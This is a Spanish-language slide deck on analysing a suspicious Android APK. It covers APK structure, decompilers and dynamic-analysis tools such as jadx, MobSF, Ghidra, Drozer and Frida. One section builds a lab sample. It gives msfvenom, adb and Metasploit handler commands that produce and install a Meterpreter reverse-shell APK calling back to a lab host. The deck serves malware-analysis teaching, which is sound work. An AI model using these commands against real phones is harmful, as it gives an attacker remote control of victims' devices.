---
title: 'Me compartieron un APK'
theme: night
highlightTheme: monokai
template: 'template.html'
css: 'style.css'
revealOptions:
    transition: 'slide'
    controls: false

---
## Analizando un apk sospechoso
#### Tony Palma
---


### About Me

Me dedico a la consultoría de TI, casado, 31 años.

- Entusiasta de infosec
- CTF Player (Mayas)
- FLOSS
- HTB
- *Disfrutar una buena taza de café* **o una cerveza bien fria**.

---


### Qué pasó la sesión pasada?

La sesión pasada Javier nos demostró que fácil es colocar un meterpreter en un APK y que con técnicas de ingeniería social, era capaz de tomar el control de nuestro móvil.

Hoy estaremos analizando una muestra de malware parecida.

---


### Agenda

- [x] Un poco de teoría sobre como funcionan las aplicaciones sobre android
- [ ] Como armar un laboratorio rápido
- [ ] Que tanto podemos encontrar en el apk infectado

---


### Android Application Package

* Archivo comprimido (ZIP)
* Estructura definida de directorios y archivos
* Control de permisos y características de la aplicación por XML
* Archivos precompilados por arquitectura, recursos no compilados y recursos de aplicaciones
* Archivo DEX (Dalvik Executable Format)


---

<!-- .slide: style="text-align: center;"> -->
### Android Application Package
![Diagrama de estructura de directorios y archivos](/img/content1.jpeg)

---


### Dalvik Virtual Machine

* No usa Java bytecode
* Los archivos DEX corren sobre la DVM
* Podemos decompilar estos archivos class en una aproximación (smali) a Java Class

Desde Android 5.0, Dalvik ha sido remplazado por the Android Runtime (ART)

---


### Análisis de Malware

* Análisis estático
  - JADX, JD, JEB
  - dextools (d2j)
* Análisis dinámico
  - Android-sdk
  - Emuladores
  - Sandbox local y remoto

---


### Reverse Engineering
![Reverse Engineering](/img/toolmap.png)

---


## Otras herramientas importantes

* Frida
* MobSF
* ghidra
* cuckoo for Android
* [https://github.com/ashishb/android-security-awesome](https://github.com/ashishb/android-security-awesome)

---


<!-- .slide: style="text-align: left" data-background="./img/titles.png"; -->
## Apliquemos conceptos

---


## 1. Generar el apk malicioso

```bash
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.99.1 LPORT=4001 -o miau.apk
```

Usando msfvenom, generamos un apk malicioso que se conectara a mi máquina cuando sea ejecutado y me devolverá un meterpreter.

---


## 2. Android VM víctima

En mi caso particular, me gusta trabajar con android-x86 que es un ISO para correr en modo LIVE un sistema operativo Android.

De esta manera todo se crea y se destruye posteriormente. Otra opción muy buena es genymotion que tiene un amplio catalogo, pero es de paga. Virtualbox + Android-x86 es el que es gratis, pero mas complicado. Interesante integrarlo con vagrant

---


## 3. ADB

Usando adb, instalamos la aplicación en la máquina virtual.

```bash
$ adb connect 192.168.99.103
$ adb install miau.apk
```

---


## 4. Listener

Levantamos en metasploit un listener de meterpreter para recibir la conexión de la víctima.

```bash
touch meterpreter.rc
echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc
echo set LHOST 192.168.99.1 >> meterpreter.rc
echo set LPORT 4001 >> meterpreter.rc
echo exploit -j -z >> meterpreter.rc

msfconsole -r meterpreter.rc
```

---


## 5. Iniciamos el ataque
Ya que tenemos a todos los músicos en escena, inicia la canción cuando abrimos la aplicación

---


## Analicemos el apk
Básicamente lo que Javier nos mostró en una serie de pasos adicionales acerca de como infectar una aplicación, pero ¿qué pasa si tomamos esa aplicación y la analizamos?

Antes de comenzar el análisis dinámico y estático conoceremos las herramientas que nos ayudaran en el proceso.

---


<!-- .slide: style="text-align: left" data-background="./img/titles.png"; -->
## Análisis estático

---


<!-- .slide: style="align: center;"-->
## jadx

La primera herramienta que vamos a revisar es JADX. DEX to Java Decompiler, esa es la descripción que tenemos del repositorio de JADX, pero esta herramienta es un todo en uno que nos permite analizar un APK como si fuera el CLASS de java. Veremos mas adelante su funcionamiento eficiente para ahorrarnos tiempo

---


## jadx

![jadx](/img/jadx1.png)

---


## apktool

El camino lento pero seguro. apktool es una herramienta que nos permite descomprimir y generar los smali de cada clase dentro del archivo classes.dex. También nos ayuda a mantener una estructura de carpetas que bajo efectos de build o decompile, nos da flexibilidad de implementar parches la aplicación.

---


### apktool

![apktool](/img/apktool1.png)

---


## dex-tools

Dex-tools son en si, un paquete de herramientas que nos permiten realizar aproximaciones de bytecode a clases en java. De esta manera, pasamos del mundo oscuro del bytecode, al mundo amigable de java. Es bastante común esta herramienta, y muchas de las aquí presentadas, la usan en background para sus operaciones, por lo que es bastante robusta.

---


## dex-tools

![dextools](/img/dextools1.png)

---


## JD

Otra herramienta que nos permite explorar las interpretaciones del bytecode y con el que podemos analizar desde lo mas básico hasta lo mas complicado del código. Yo particularmente uso mucho esta herramienta ya que la siento bastante ligera cuando se trata de muchos archivos.

---


## JD

![JD-gui](/img/jdgui1.png)

---


## Mobile Security Framework (MoSF)

Si combinamos las herramientas antes mencionadas y automatizar el proceso, concentrando en una sola que nos pueda ayudar a identificar que realiza la aplicación, cual es su comportamiento, y mas aun, generar reportes y mantener una base de datos de las muestras que procesamos, eso es Mobile Security Framework.

---


## MoSF

![mosf](/img/mosf1.png)

---


## Ghidra

Ghidra es una herramienta de reversing muy famosa, porque cuenta con un poderoso decompilador y por ser liberada por la NSA. Sus herramientas incluyen las dextools que nos permite explorar y trabajar con el APK-\>DEX-\>JAR, asi como las bibliotecas que hayan sido compiladas para cada arquitectura (nativas). Este es el ultimo bastión donde exploraríamos estáticamente una aplicación.

---


## Ghidra

![ghidra](/img/ghidra1.png)

---


<!-- .slide: style="text-align: left" data-background="./img/titles.png"; -->
## Análisis Dinámico

---


## Android-x86

Como mencione anteriormente, android-x86 nos permite levantar una máquina virtual en cualquier hipervisor mediante su compatibilidad con la arquitectura X86 y correr android on-memory, al estilo 2000s live cd.

---


## Android-x86

![android-x86](/img/androidvm1.png)

---


## Drozer

Al puro estilo de un 'man in the midle', Drozer nos permite evaluar la seguridad de las aplicaciones al utilizar un modelo de agente encubierto que extrae la información de las aplicaciones ejecutándose en el dispositivo. Permisos, SQLi, content provieders, etc.

---


## Drozer

![drozer](/img/drozer1.png)

---


## Frida

Finalmente una herramienta que estado explorando mucho este año. Frida, la herramienta de instrumentación dinámica por excelencia. ¿Qué podemos hacer en frida? Por ejemplo, asociarnos al proceso de la aplicación e injectar scripts dentro de la aplicación, o podemos hookear funciones no nativas para pasar protecciones. 

---


## Frida

![frida](/img/frida1.png)

---


<!-- .slide: style="text-align: left" data-background="./img/titles.png"; -->
## Vamos a trabajar con ese malware

---


# Muchas gracias por asistir!
